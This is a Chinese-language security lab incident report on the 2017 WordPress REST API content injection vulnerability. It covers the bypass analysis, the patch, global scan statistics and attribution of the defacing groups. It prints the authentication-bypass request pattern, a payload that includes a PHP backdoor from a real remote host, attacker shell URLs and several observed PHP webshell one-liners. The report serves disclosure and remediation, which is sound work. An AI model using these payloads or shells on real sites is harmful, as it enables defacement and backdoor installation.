**PDF 版报告下载** ：[WordPress REST API
内容注入漏洞事件分析报告](http://paper.seebug.org/papers/Archive/Wordpress%20REST%20APIl%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.pdf)

**English Version：**[WordPress REST API Content Injection Vulnerability
Incident Analysis
Report](http://paper.seebug.org/papers/Archive/WordPress%20REST%20API%20Content%20Injection%20Vulnerability%20Incident%20Analysis.pdf)

作者： **知道创宇404安全实验室**

报告发布日期：2017年02月28日

### 一、事件概述

#### 1 漏洞简介：

WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。在4.7.0版本后，REST API插件的功能被集成到
WordPress 中，由此也引发了一些安全性问题。近日，一个由 REST API 引起的影响 WordPress
4.7.0和4.7.1版本的漏洞被披露，该漏洞可以导致 WordPress 所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。

在2017年2月11日，经过知道创宇404安全实验室使用 ZoomEye
网络空间探测引擎进行扫描探测后发现，受该漏洞影响的网站仍然有15361个，其中有9338个网站已经被黑客入侵并留下了组织代号。我们针对组织代号进行统计，发现共出现了八十余种代号。

我们使用 ZoomEye 网络空间搜索引擎搜索 `"app:WordPress ver:4.7.1"` ，获得36603条结果。以下是
https://www.zoomeye.org/search?t=web&q=app%3AWordPress+ver%3A4.7.1 的搜索结果：

![](https://images.seebug.org/content/images/2017/02/9C9510AB-31C2-4CC8-99B3-A7EEA2C8E77A.png-w331s)

#### 2 漏洞影响：

导致 WordPress 所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。

#### 3影响版本：

  * WordPress 4.7.0
  * WordPress 4.7.1

### 二、时间线

![](https://images.seebug.org/content/images/2017/02/84EDF8F5-2434-443E-ADCB-4733EB6453B3.png-w331s)

### 三、漏洞验证与分析

PoC：

[Seebug](https://www.seebug.org/vuldb/ssvid-92637) 上已经给出详细的复现过程，在复现过程中可以使用
Seebug 收录的 PoC 来进行测试。 https://www.seebug.org/vuldb/ssvid-92637

漏洞验证扫描插件： Seebug 已经更新了 WordPress REST API 内容注入漏洞的扫描插件。 (
https://www.seebug.org/monster/ )

![](https://images.seebug.org/content/images/2017/02/C6304274-EFE7-475E-8151-8EBD64F610BE.png-w331s)

#### (1)在此给出简单的复现过程：

安装 WordPress存在漏洞版本并配置 REST API ，配置 Apache+PHP+Mysql 的运行环境。加载 Apache 的 rewrite
模块以及主配置文件配置如下图：

![](https://images.seebug.org/content/images/2017/02/5335D8C6-9B0D-440A-9885-002CBF7FED7C.png-w331s)

设置 WordPress 站点为固定链接：

![](https://images.seebug.org/content/images/2017/02/22F63030-4865-464C-9C4B-9ADC754103F6.png-w331s)

1\. 构造数据包可看到不带任何验证信息会提示不允许编辑文章：

![](https://images.seebug.org/content/images/2017/02/6DF3336D-BEAD-4579-B742-F7484C29FB4A.png-w331s)

2\. 构造可利用的数据包，当 url 为 /wp-json/wp/v2/posts/1?id=1a 时可以看到成功跳过验证看到文章内容：
![](https://images.seebug.org/content/images/2017/02/ECE5A8AB-715C-4BE4-837F-6DF9F72B3E87.png-w331s)

木马后门插入：

需要安装如 `insert_php` ， `exec_php` 等允许页面执行PHP 代码的插件。 可以构造数据包如下：

    
    
    content:"[insert_php] include('http[:]//acommeamour.fr/tmp/xx.php'); [/insert_php][php] include('http[:]//acommeamour.fr/tmp/xx.php'); [/php]","id":"61a"}

上传后木马后门被插件当做 PHP 代码执行，网站被植入后门。

#### （2）漏洞分析：

paper 已经发表了关于此漏洞的详细分析，以此作为参考。(http://paper.seebug.org/208/ )

首先，在 `./wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php` 中

![](https://images.seebug.org/content/images/2017/02/681AA96A-168E-44E4-A5C6-1C3202FA2B82.png-w331s)

这里对路由进行了正则限制，防止攻击者恶意构造 id 值，但是我们可以发现 `$get` 和 `$post` 值优先于路由正则表达式生成的值。

接下来在 `update_item` 方法及其权限检查函数`update_item_permissions_check` 中：

![](https://images.seebug.org/content/images/2017/02/CE30F6D4-760E-47C3-BA6C-AB8160ECCCA8.png-w331s)

可以看出当我们发送一个没有响应文章的 id 时，就可以通过权限检查并允许继续执行对 `update_item` 方法的请求。具体到代码就是让 `$post`
为空来绕过权限检查。

那么怎么让 `$post` 为空呢？跟进到 `get_post` 方法发现其使用 `wp_posts` 中的 `get_instance`
静态方法获取文章：

![](https://images.seebug.org/content/images/2017/02/52935C75-FBC4-4629-A842-D75BFE2E63AC.png-w331s)

当我们传入的id 不是全由数字字符组成时返回 false，从而 `get_post` 方法返回null，接着绕过权限检查。 回头再看可执行方法
`upload_item`：

![](https://images.seebug.org/content/images/2017/02/45819E68-F6DE-4879-9A37-4AB72B2D6C8A.png-w331s)

这里 `$id` 这个参数做了类型转化传递给 `get_post` 。而PHP类型转换时会出现这种情况：

![](https://images.seebug.org/content/images/2017/02/992A11CB-7C76-43DA-A5DA-D4C55ADA5659.png-w331s)

也就是说攻击者发起 `/wp-json/wp/v2/posts/1?id=1hhh` 的请求就是发起了对id 为1的文章的请求。

#### （3）漏洞修复：

在 `/wp-includes/class-wp-post.php` 中：

![](https://images.seebug.org/content/images/2017/02/C4D0C316-9D3B-4D64-B50F-68F578DC1D95.png-w331s)

更改了对于 $post_id 的参数的传入顺序和判断条件，防止了我们传入“数字+字母”这样的格式进行绕过。

### 四、漏洞影响分布

**第一次扫描探测结果：**

我们于 2017/02/11 对全球的 WordPress 网站进行了扫描探测，发现当时仍旧受影响的 WordPress 网站共有 15361个。

这些网站分别归属于82个国家与地区，其中 Top20 国家与地区分布如下图：

![](https://images.seebug.org/content/images/2017/02/937560ED-D6CE-4547-85DE-D29C2DBEE9AE.png-w331s)

**第二次扫描探测结果：**

我们于 2017/02/14 对全球的 WordPress 网站再次进行了扫描探测，获取最新数据如下：

现存漏洞站数量：13390 个，与 2017/02/11 数据对比减少了1971 个。 其中数据重合量为12584 个，网站新增量为 806
个，存在代码执行插件的网站数量为 905 个。

![](https://images.seebug.org/content/images/2017/02/7AEE9D68-06BA-4B49-906B-3940B0C2F1EF.png-w331s)

**第三次扫描探测结果：**

我们于 2017/02/20 对全球 WordPress 网站进行了第三次扫描探测。

根据第三次得到的数据，我们发现全球依旧存在漏洞的 WordPress
网站数量为11573个，其中与第二次数据重合量为11182个，新增数量为391个，消失数量为2208个，存在代码执行插件的网站数量为69个。

**三次扫描探测数据对比：**

分析上图，我们发现：

  1. 存在漏洞且一直未修复的网站基数还是很大。
  2. 存在允许代码执行插件的漏洞网站数量不多，对现存漏洞网站影响不大。 

**Top10国家存在漏洞网站总量与消失量对比：**

![](https://images.seebug.org/content/images/2017/02/EA40FE25-0192-43F9-B248-827A88B9D8F5.png-w331s)

根据上图我们能很清晰的看出， 02/11 后消失的漏洞网站数量约占原有漏洞网站总量的三分之一 。

#### 网页污染行为分析：

我们于 2017/02/13 探测这些网站的运行情况，发现共有 9338 个网站已经留下了黑客的痕迹。（痕迹如 hacked by xxx）

Ps：我们探测的是依旧存在漏洞的网站并获取网站最新文章信息，而在经过修复的网站上还是有可能存在黑客入侵的痕迹。

我们统计了黑客组织留下的黑客代号，发现不同的黑客代号共出现了85种。其中 Top20黑客组织代号如下表：

![](https://images.seebug.org/content/images/2017/02/1CA7F07E-E4D2-4AD9-9EF2-1D9A46A9504D.png-w331s)

上表说明的是此时依旧活跃在互联网上的针对该漏洞的黑客组织的排名。 我们分析了黑客留下的痕迹，初步总结了以下几点信息：

1\. 代号为w4l3XzY3 的黑客是事件早期被报道出来的黑客之一，此人曾经于2014年针对 Drupal
网站进行过相同性质的入侵行为。分析其过往行为发现该黑客一直在入侵网站挂黑页，Google搜索该代号已有295000条记录，已经是个惯犯了。
https://www.drupal.org/node/2394801

此人推特链接如下： https://twitter.com/w4l3xzy3

在 nairaland 论坛上有他留下的一些个人信息以及售卖php shell等工具的主题：
http://www.nairaland.com/w4l3xzy3

2\. 代号为 SA3D HaCk3D 与 MuhmadEmad 的黑客入侵后留下的页面是相似的，宣传反 ISIS 的信息。前者提到了 peshmarga
，应该是一个中东国家，具有反美倾向。后者提到了 kurdistan ，是黑客组织 “ KurdLinux_Team ”
的成员。该人疑似曾在推特上炫耀自己的黑客行为。 https://twitter.com/muhmademad

3\. 代号为 GeNErAL HaCkEr ，GeNErAL 与 RxR HaCkEr 的黑客同样疑似出自同一组织。他们还留下了一个 qq
号码：21*****233 。 搜索该账号获得信息如下图：

![](https://images.seebug.org/content/images/2017/02/362B26C8-9F50-4D1B-8577-11ECE1972259.png-w331s)

可以看到组织名为 “ Team Emirates” 搜索相关信息发现一个疑似的相关推特 https://twitter.com/rxrhackerr

4\. 代号为 GHoST61 的黑客留下的信息为土耳其语，翻译出来大意是土耳其无处不在，疑似是出自土耳其的黑客组织。

### 五、后续影响分析

**暗链与插件导致的PHP代码注入与 RCE ：**

我们发现当未修复漏洞的网站启用了如 `insert_php` 或 `exec_php` 等允许网页执行 PHP
代码的插件时，黑客利用此漏洞除了能够在网页中插入暗链还能在网站中注入后门并以此牟利。

我们在15361个未修复漏洞的目标站点中，探测到的使用了这两种插件的网站有905个，已经被注入木马后门的网站一共有158个。其中插入的一句话木马口令共有98种。

![](https://images.seebug.org/content/images/2017/02/A35EB5EF-A88D-43C7-9F93-D8E164217CF3.png-w331s)

**暗链发现情况：**

在本次探测到的数据中发现暗链出现频率第一的网址 http://biturlz.com ，重定向到 https://bitly.com
这个网址，出现次数355次。

出现频率第二的是 www.yellowfx.com 这个网址，53次。

余下的网址出现频率则比较接近，分布范围较广。

本次探测到的黑客shell地址如下：

http://pastebin.com/raw/ku5zcKfu https://paste.ee/r/3TwsC/0
http://pastebin.com/k20u5zcKfu http://pastebin.com/raw/F9ffPKBM
http://pastebin.com/raw/gYyy6Jd7 http://pastebin.com/raw/fXB166iS
http://pastebin.com/raw/gLc9bi4z http://acommeamour.fr/tmp/3jqy4.php

**PHP shell 种类：**

从探测到的数据分析，此次事件中出现的shell种类如下：

    
    
    1： if(isset($_REQUEST[xxx])){eval($_REQUEST[xxx]);exit;}
    2： include(‘;http://pastebin.com/raw/F9ffPKBM’;);
    3： file_put_contents(‘;wp-content/uploads/info.php’; ”;);
    4： fwrite(fopen(‘;wp-content/uploads/wp.php’;’;w+’;)file_get_contents(‘;http://pastebin.com/raw/ku5zcKfu’;));
    5： if ( copy(‘;https://paste.ee/r/3TwsC/0’; ‘;db.php’;) ) 
        {echo ‘;Content_loaded_please_wait!’;;}else{echo ‘;Content_failed.’;;}

#### 总结：

黑客利用 pastebin.com 等网站存放 shell，目前为止这些网站已经开始陆续关闭。攻击峰潮已过，我们需要抓紧进行事后补救工作。

值得注意的是虽然本次探测到的被植入后门的网站数量并不是很多，但是修复漏洞并不代表清理了后门，所以实际被挂马的网站数量将会更多。

建议启用了类似 insert-php 插件的用户在升级 WordPress之后检查网站目录，查杀木马。尤其是 wp-content/uploads/
目录，检查网站目录下是否出现文件改动如 wp.php ， info.php ， db.php 等文件并核查文件内容。

从获取到的黑客shell 内容分析，( index.php ， apis.php ， wp.php ， info.php ， db.php ，
css.php ， insert_php.php )这些文件是需要重点检查的。

对于此次事件，我们还会在将来持续跟进。

### 六、漏洞修复方案

升级 WordPress到最新版 4.7.2 ，可以选择 下载 [WordPress 4.7.2
](https://wordpress.org/download/)或者前往后台更新面板手动点击升级。支持后台自动升级的网站已经自动完成升级过程。

### 七、相关链接

  * https://www.seebug.org/vuldb/ssvid-92637
  * https://www.seebug.org/monster/
  * https://www.exploit-db.com/exploits/41223/
  * https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
  * https://wordpress.org
  * https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/

### 关于

404 Team，国内黑客文化浓厚的知名安全公司知道创宇神秘而核心的部门，最为大家熟知的分享包括：KCon 黑客大会、Seebug 漏洞平台、ZoomEye
钟馗之眼网络空间搜索引擎。

404 Team 依托 Seebug 与 ZoomEye
两大平台能力及内部的漏洞相关工业化平台能力（WSL），总能在漏洞爆发的最小黄金周期内完成全球性响应。

除了依托这些开放平台打造了全球黑客生态圈之外，404 Team 还在持续创新创造，为整个知道创宇业务需求输出精心打磨的漏洞弹药及相关安全产品。

404 Team，守正出奇，知行合一。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/234/>

